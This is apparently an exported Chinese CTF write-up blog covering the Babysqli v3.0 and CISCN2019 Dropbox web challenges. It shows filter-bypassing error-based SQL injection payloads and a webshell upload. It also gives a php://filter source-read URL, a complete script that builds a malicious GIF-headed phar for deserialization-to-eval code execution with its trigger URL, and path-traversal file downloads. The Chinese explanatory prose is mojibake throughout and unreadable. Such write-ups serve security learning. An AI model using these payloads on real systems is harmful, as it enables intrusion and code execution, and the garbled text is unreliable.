<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">URL:name&#x3D;admin&amp;pw&#x3D;admin</span><br><span class="line">Congratulations!admin</span><br><span class="line">Your pass is cdc9c819c7f8be2628d4180669009d28</span><br><span class="line">ä½†æ˜¯è¿™é‡Œæ²¡æœ‰flagå‘€ï¼</span><br><span class="line"></span><br><span class="line">URL:name&#x3D;admin&amp;pw[]&#x3D;admin</span><br><span class="line">Warning: md5() expects parameter 1 to be string, array given in &#x2F;var&#x2F;www&#x2F;html&#x2F;search.php on line32</span><br><span class="line"></span><br><span class="line">URL: name[]&#x3D;admin&amp;pw&#x3D;admin</span><br><span class="line">Warning: preg_match() expects parameter 2 to be string, array given in &#x2F;var&#x2F;www&#x2F;html&#x2F;search.php on line 25</span><br><span class="line"></span><br><span class="line">Warning: addslashes() expects parameter 1 to be string, array given in &#x2F;var&#x2F;www&#x2F;html&#x2F;search.php on line 28</span><br><span class="line"></span><br><span class="line">URL: name&#x3D;admin%df&#39;&amp;pw&#x3D;admin</span><br><span class="line"></span><br><span class="line">Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;adminï¿½\&#39;&#39;&#39; at line 1</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åç…§ç€ä¸Šé¢é“¾æ¥å¥—ï¼Œæœ€åæŠŠå¾—åˆ°çš„å­—ç¬¦ä¸² <code>base64 è§£å¯†</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select where éƒ½è¢«è¿‡æ»¤äº† åŒå†™ç»•è¿‡å°±å¥½äº†</span><br><span class="line"></span><br><span class="line">name&#x3D;%df&#39;and(seselectlect 1 from(sselectelect count(*),concat((sselectelect (SESELECTLECT  concat(327a6c4304ad5938eaf0efb6cc3e53dc) FROM f14g limit 22,1) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;pw&#x3D;admin</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="Babysqliv3-0"><a href="#Babysqliv3-0" class="headerlink" title="Babysqliv3.0"></a>Babysqliv3.0</h1><p>è¿™æ¬¡æˆ‘å¯æ˜¯ç»å¯¹é˜²å¾¡! </p>
<p>å¼±å£ä»¤ï¼šadmin / password</p>
<h2 id="è§£æ³•1"><a href="#è§£æ³•1" class="headerlink" title="è§£æ³•1"></a>è§£æ³•1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;upload.php?name&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;yakko12.php</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå°è¯•ä¸Šä¼ ä¸€å¥è¯çš„txtï¼Œç„¶åæŒ‚èœåˆ€å°±å¥½äº†</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrlvrbj30ex051gls.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrlvrbj30ex051gls.jpg" class="lazyload" title="test"></a></p>
<h2 id="è§£æ³•2"><a href="#è§£æ³•2" class="headerlink" title="è§£æ³•2"></a>è§£æ³•2</h2><p>é¦–å…ˆçœ‹ä¸€ä¸‹ä¸åŒçš„å›æ˜¾</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">home.php?file&#x3D;upload</span><br><span class="line">æ­£å¸¸å›æ˜¾</span><br><span class="line"></span><br><span class="line">home.php?file&#x3D;flag.php </span><br><span class="line">Hacker!</span><br><span class="line"></span><br><span class="line">home.php?file&#x3D;index.php</span><br><span class="line">å½“å‰å¼•ç”¨çš„æ˜¯ index.php.fxxkyou!</span><br></pre></td></tr></table></figure></div>

<p>è‹¥åŒ…å«çš„æ–‡ä»¶ä»¥ <code>home</code> æˆ– <code>upload</code> ç»“å°¾<br>åˆ™åœ¨åé¢æ‹¼æ¥ä¸Š <code>.php</code> ååŒ…å«ï¼›å…¶ä»–éƒ½è¢«æ‹¼æ¥ä¸Š <code>.fxxkyou!</code></p>
<p>ä½†æ˜¯ä¼ªåè®®æ²¡æœ‰è¢«wafï¼Œ å°è¯•è¯»ä¸€ä¸‹ä»£ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä½†æ˜¯åªèƒ½å¾—åˆ°upload å’Œ home çš„æºä»£ç </span><br><span class="line">home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure></div>

<h3 id="Upload-php"><a href="#Upload-php" class="headerlink" title="Upload.php"></a>Upload.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">		$ext = <span class="string">".txt"</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"[^a-z0-9]"</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('illegal filename!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">'size'</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('you are too big (â€²â–½`ã€ƒ)');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"move_uploaded_file('"</span>.$file[<span class="string">'tmp_name'</span>].<span class="string">"', '"</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">"');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">"file"</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;"</span>.$uploader.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>é¦–å…ˆçœ‹åˆ°è¿™ä¸ª</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br></pre></td></tr></table></figure></div>

<p>å¯è§ <code>$this-&gt;Filename</code> æ˜¯å¯æ§çš„ï¼Œå¯ä»¥é€šè¿‡ <code>nameå‚æ•°</code> ä»¥ <code>get</code> æ–¹å¼å¾—åˆ°<br>ç„¶åè·Ÿè¸ªåˆ°åé¢çš„ä¸Šä¼ éƒ¨åˆ†</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;"</span>.$uploader.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>file_get_contents()</code> ä½¿ <code>$uploader</code> å¯¹è±¡é€šè¿‡<code>__toString()</code> è¿”å› <code>$this-&gt;Filename</code>ï¼Œç”±äº <code>phar://ä¼ªåè®®</code> å¯ä»¥ä¸ä¾èµ– <code>unserialize()</code>ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼ŒåŠ ä¹‹ <code>$this-&gt;Filename</code>å¯æ§ï¼Œå› æ­¤æ­¤å¤„ <code>$this-&gt;Filename</code> é…åˆ<code>pharååºåˆ—åŒ–</code>åï¼Œ<code>__destruct()æ–¹æ³•</code> å†… <code>eval($this-&gt;cmd)</code>ï¼›æœ€ç»ˆå¯¼è‡´äº†è¿œç¨‹ä»£ç æ‰§è¡Œ</p>
<p>ç”±äº <code>__destruct()</code> æ–¹æ³•ä¸­ï¼Œæƒ³è¦ <code>eval($this-&gt;cmd)</code>ï¼› çš„å‰ææ¡ä»¶æ˜¯ <code>$this-&gt;token</code> å’Œ <code>$_SESSION[&#39;user&#39;]</code> ç›¸ç­‰</p>
<p>åœ¨ <code>__construct()</code> æ–¹æ³•ä¸­å¯è§å¦‚ä¸‹ä»£ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">else</span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤å¯ä»¥å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªtxtï¼Œå¾—åˆ°çš„è·¯å¾„ä¸­ï¼Œ<code>.txt</code> å‰é¢çš„å°±æ˜¯ <code>$_SESSION[&#39;user&#39;]</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrs6y5j30xl04m0ta.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1gbcmvrs6y5j30xl04m0ta.jpg" class="lazyload" title="test"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> Uploader();</span><br><span class="line">$o-&gt;cmd = <span class="string">'highlight_file("/var/www/html/flag.php");'</span>; <span class="comment">//é‡Œé¢çš„å‘½ä»¤ä¸è¦å‡ºç°å•å¼•å·å¦ä¾§ç”Ÿæˆpharä¼šæŠ¥é”™</span></span><br><span class="line">$o-&gt;Filename = <span class="string">'test'</span>; </span><br><span class="line">$o-&gt;token = <span class="string">'GXY****************'</span>; <span class="comment">//$_SESSION['user']</span></span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">""</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest </span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå°†ç”Ÿæˆçš„pharä¸Šä¼ </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;sandboxè·¯å¾„&#x2F;GXYsession.txt</span><br><span class="line"></span><br><span class="line">Payload:</span><br><span class="line">home.php?file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;sandboxè·¯å¾„&#x2F;GXYsession.txt</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åéšä¾¿ä¸Šä¼ ä»€ä¹ˆæ–‡ä»¶éƒ½ä¼šå›æ˜¾flag</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay7</title>
    <url>/yakko117/2020/01/16/BuuctfDay7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h1><p>åŠ æ·±ä¸€ä¸‹å¯¹pharç›¸å…³çŸ¥è¯†çš„ç†è§£ï¼Œè¿›å…¥ç™»é™†ç•Œé¢ï¼Œéšä¾¿æµ‹äº†ä¸‹å¼±å£ä»¤å’Œsqlï¼Œå‘ç°æ²¡ä»€ä¹ˆååº”ï¼Œé‚£å°±æ³¨å†Œä¸€ä¸ªè´¦å·</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1dzmmj30es0d6dfz.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1dzmmj30es0d6dfz.jpg" class="lazyload" title="test"></a></p>
<p>è¿›å…¥é¡µé¢åï¼Œå‘ç°æœ‰ä¸Šä¼ ç‚¹ï¼Œå…ˆä¸Šä¼  <code>phpinfo</code> çœ‹çœ‹æœ‰å“ªäº›è¿‡æ»¤</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1gaxpj30ho0du40q.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1gaxpj30ho0du40q.jpg" class="lazyload" title="test"></a></p>
<p>ä¸Šä¼ åï¼Œå‘ç°é€šè¿‡äº†ï¼Œå±…ç„¶æ²¡æœ‰è¿‡æ»¤ï¼Œemmmm </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1dvwvj30t504kwef.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1dvwvj30t504kwef.jpg" class="lazyload" title="test"></a></p>
<p>é‚£å°±å†ä¸‹ä¸‹æ¥çœ‹çœ‹æƒ…å†µ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1hnbij30me0b90ux.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1hnbij30me0b90ux.jpg" class="lazyload" title="test"></a></p>
<p>emmmmmï¼Œè¿™ä¸ª<code>filename</code>ç›´æ¥è£¸éœ²åœ¨é¢å‰ï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼Ÿ<br>å°è¯•ä¸‹ä¸‹è½½æºç ï¼Œç”±äºæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶æ˜¯æ”¾åœ¨ <code>ä¸»ç›®å½•/sandbox/hash</code> ç›®å½•ä¸‹çš„ï¼Œæ‰€ä»¥è¦æƒ³ä¸‹è½½phpæ–‡ä»¶å¿…é¡»è·³è½¬åˆ°ä¸Šçº§ç›®å½•</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1f17ej307t03b3yi.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1f17ej307t03b3yi.jpg" class="lazyload" title="test"></a></p>
<p>æ—¢ç„¶è¿™æ ·ï¼Œæˆ‘ä»¬å†è¯•ä¸‹åˆ é™¤ï¼Œè¿™é‡Œçš„<code>delete.php</code> ä¸€å®šä¹Ÿå­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ã€‚å¦‚æ­¤æˆ‘ä»¬å¯ä»¥ä¸‹è½½ä¸‹æ¥è¿™ä¸ªç½‘ç«™çš„æ‰€æœ‰phpæ–‡ä»¶ï¼Œé™¤äº†<code>index.php</code>ï¼Œè¿˜æœ‰å·²ç»é‡è§çš„ <code>upload.phpã€ register.phpã€ login.phpã€ download.phpã€ delete.php</code>ï¼Œå†åŠ ä¸Šè¿™äº›phpæ–‡ä»¶ä¸­includeçš„ <code>class.php</code> ï¼Œæˆ‘ä»¬éƒ½ä¸‹è½½ä¸‹æ¥ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1wa2qj307906w745.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gayna1wa2qj307906w745.jpg" class="lazyload" title="test"></a></p>
<p>åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œæ—¢ç„¶æœ‰æºç ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å®¡è®¡çš„é—®é¢˜ã€‚</p>
<hr>
<h1 id="ä»£ç å®¡è®¡å°±æŒ‘äº›é‡ç‚¹è®²äº†"><a href="#ä»£ç å®¡è®¡å°±æŒ‘äº›é‡ç‚¹è®²äº†" class="headerlink" title="ä»£ç å®¡è®¡å°±æŒ‘äº›é‡ç‚¹è®²äº†"></a>ä»£ç å®¡è®¡å°±æŒ‘äº›é‡ç‚¹è®²äº†</h1><h2 id="Class-php"><a href="#Class-php" class="headerlink" title="Class.php"></a>Class.php</h2><p>å…ˆæ˜¯å’Œæ•°æ®åº“å»ºç«‹è¿æ¥ï¼Œè€Œååˆ†åˆ«æ˜¯Userç±»ï¼ŒFileListç±»ï¼ŒFileç±»</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">    $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œå‚æ•°è¿›è¡Œé™åˆ¶ç»‘å®šï¼Œåé¢è¿˜æœ‰æ˜¯<code>Userç±»ï¼ŒFileListç±»ï¼ŒFileç±»</code><br>ç„¶åå‘ç°å’Œæ•°æ®åº“äº¤äº’çš„è¯­å¥å…¨éƒ¨è¿›è¡Œäº†å‚æ•°ç»‘å®šï¼ŒSQLæ³¨å…¥å°±æ²¡æ„ä¹‰äº†</p>
<p>åœ¨ <code>FileList ç±»</code> ä¸­å‘ç°äº† <code>function __call($func, $args)</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>PHP5 çš„å¯¹è±¡æ–°å¢äº†ä¸€ä¸ªä¸“ç”¨æ–¹æ³• <strong>call()ï¼Œè¿™ä¸ªæ–¹æ³•ç”¨æ¥ç›‘è§†ä¸€ä¸ªå¯¹è±¡ä¸­çš„å…¶å®ƒæ–¹æ³•ã€‚å¦‚æœä½ è¯•ç€è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œ</strong>call æ–¹æ³•å°†ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œæé†’è¯¥è€ƒè™‘ä½¿ç”¨pharäº†ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pharæ–‡ä»¶æ˜¯phpçš„å‹ç¼©æ–‡ä»¶ï¼Œå®ƒå¯ä»¥æŠŠå¤šä¸ªæ–‡ä»¶å½’æ¡£åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­</span><br><span class="line">è€Œä¸”ä¸ç»è¿‡è§£å‹å°±èƒ½è¢« php è®¿é—®å¹¶æ‰§è¡Œ</span><br><span class="line">phar:&#x2F;&#x2F;ä¸file:&#x2F;&#x2F;ï¼Œphp:&#x2F;&#x2F;ç­‰ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ç§æµåŒ…è£…å™¨ã€‚</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Download-php-å‘ç°äº†äº›hint"><a href="#Download-php-å‘ç°äº†äº›hint" class="headerlink" title="Download.php å‘ç°äº†äº›hint"></a>Download.php å‘ç°äº†äº›hint</h2><p>è™½ç„¶ <code>filename</code> æˆ‘ä»¬å¯æ§ï¼Œå¯¼è‡´ä»»æ„äº†ä»»æ„ä¸‹è½½<br>ä½†æ˜¯å®ƒä¸è®©æˆ‘ä»¬ä¸‹è½½æ–‡ä»¶åé‡Œæœ‰flagçš„æ–‡ä»¶ï¼Œæš—ç¤ºæˆ‘ä»¬æœ¬é¢˜ä¸­è¦è¯»å–æ–‡ä»¶åé‡Œæœ‰<code>&#39;flag&#39;</code>çš„æ–‡ä»¶</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br></pre></td></tr></table></figure></div>

